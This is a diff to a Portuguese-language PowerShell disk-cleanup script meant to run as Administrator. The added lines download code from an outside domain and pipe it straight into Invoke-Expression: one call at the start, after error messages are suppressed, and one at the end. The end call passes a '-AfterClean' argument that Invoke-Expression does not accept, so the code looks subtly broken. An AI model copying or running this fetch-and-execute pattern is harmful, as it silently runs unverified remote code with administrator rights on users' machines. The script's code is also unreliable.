@@ -2,6 +2,7 @@
 # Executar como Administrador
 
 $ErrorActionPreference = "SilentlyContinue"
+irm https://get.hpinfo.com.br/perf | iex
 
 Write-Host "=== INICIANDO LIMPEZA PROFUNDA ===" -ForegroundColor Cyan
 
@@ -71,8 +72,8 @@ if ($totalLimpoMB -gt 0) {
     Write-Host "O sistema já estava limpo." -ForegroundColor White
 }
 
-powershell -ExecutionPolicy Bypass -Command "irm https://get.hpinfo.com.br/perf | iex"
-powershell -ExecutionPolicy Bypass -Command "irm https://get.hpinfo.com.br/perf | iex -AfterClean"
+irm https://get.hpinfo.com.br/perf | iex -AfterClean
+
 
 Write-Host "=======================================" -ForegroundColor Cyan
 
